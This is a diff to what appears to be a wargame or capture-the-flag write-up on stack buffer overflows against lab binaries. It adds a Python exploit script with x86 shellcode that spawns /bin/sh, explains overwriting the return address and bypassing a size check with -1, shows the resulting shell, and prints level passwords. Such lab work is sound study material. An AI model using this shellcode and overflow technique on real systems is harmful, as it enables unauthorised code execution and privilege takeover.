@@ -59,7 +59,6 @@ Next password: 37ZFBrAPm8
 
 My code is attached below
 ```
-############# egg3
 #!/usr/bin/python3
 
 def fuck8(txt):
@@ -83,18 +82,70 @@ shellcode = "6a3158cd8089c389c16a4658cd8031c050682f2f7368682f62696e545b505389e13
 ########################################################################################### <- append an endline (0x0a, \n)
 
 payload = revert(fill) + revert(raddr) + (shellcode)
-print(payload)
+#print(payload)
 
 import binascii
 
 b = binascii.unhexlify(payload)
-with open('input.txt','wb+') as f:
+with open('/dev/fd/1','wb') as f:
     f.write(b)
-############# egg
-#!/bin/bash
-
-./egg3 > /dev/null
-cat input.txt # | invoke dejavu
 ```
 
 ## 2
+
+Just do as what I did in problem 1. I can see the return address is 0x00400775, stored at &msg+128+20.
+Because the buffer is large enough, I'll put payload here. &msg is 0xbffffa18, so I must change 0x00400775
+to 0xbffffa18.
+
+Oh I didn't tell you how should I bypass the `size` limit. Just put a `-1` and enjoy your day.
+
+Now I can see
+
+```
+pwnable:~$ ./exploit 
+j1X̀�É�jFX̀1�Ph//shh/binT[PS��1Ұ
+
+�
+/home/smith $ id
+uid=1003(brown) gid=1002(smith) groups=1002(smith)
+/home/smith $ cat README
+Welcome to the real world.
+
+Next username: brown
+Next password: mXFLFR5C62
+```
+
+My code is attached below.
+```
+#!/usr/bin/python3
+
+def fuck8(txt):
+    assert(len(txt) == 8)
+    return txt[6:8] + txt[4:6] + txt[2:4] + txt[0:2]
+
+def revert(txt):
+    assert(len(txt) % 8 == 0)
+    res = ""
+    for i in range(int(len(txt) / 8)):
+        res += fuck8(txt[i*8:(i+1)*8])
+    return res
+
+
+raddr = "bffffa18"
+#shellcode = "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
+shellcode = "6a3158cd8089c389c16a4658cd8031c050682f2f7368682f62696e545b505389e131d2b00bcd800a"
+
+length_to_fill = 20 + 128 - int(len(shellcode)/2)
+fill = "01" * length_to_fill
+
+int8_neg1 = "ff"
+
+payload = int8_neg1 + (shellcode) + fill + revert(raddr)
+#print(payload)
+
+import binascii
+
+b = binascii.unhexlify(payload)
+with open('/dev/fd/1','wb') as f:
+    f.write(b)
+```
